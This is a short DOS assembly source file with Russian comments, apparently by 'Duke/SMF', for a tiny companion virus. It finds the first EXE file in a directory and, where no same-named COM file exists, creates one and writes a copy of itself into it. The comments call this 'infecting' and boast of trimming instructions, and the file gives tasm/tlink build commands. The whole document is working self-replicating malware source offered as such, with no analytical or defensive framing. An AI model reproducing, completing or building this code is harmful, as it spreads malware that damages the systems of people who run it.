;Было  : C.41 by Duke/SMF  (22.05.99)
;Стало : C.40 by Duke/SMF

;Если в текущем каталоге есть EXE-файл (первый, если их много),
;и у него нет одноименного COM, то поразим (создадим COM) и отвалим.
;Управления не возвращаем, ничерта не проверяем :)
; tasm comp40.asm /m
; tlink comp40.obj /t

;На этот раз я отсек еще одну команду - как ни странно, продолжает работать :)

.Model Tiny
.code
.386
org 100h
start:
E_Mask db '*.e*'
       mov  di,9eh
       xchg cx,ax              ;cx=0
       mov  ah,4eh

       CALL NewFile

NewFile:
       push si
       pop dx                  ;       mov dx,si
       int 21h

;TestFile:
       mov dx,di
       mov ax,5b2eh
@1:
       scasb
       jne @1
       mov dword ptr [di],' moc'
       int 21h
;       jc @Exit               ;когда придет время все равно сами выйдем ;-))
       xchg bx,ax
       mov ah,40h
       mov cl,MyLength
;@Exit:
       ret
;---
MyLength equ $-start
end start
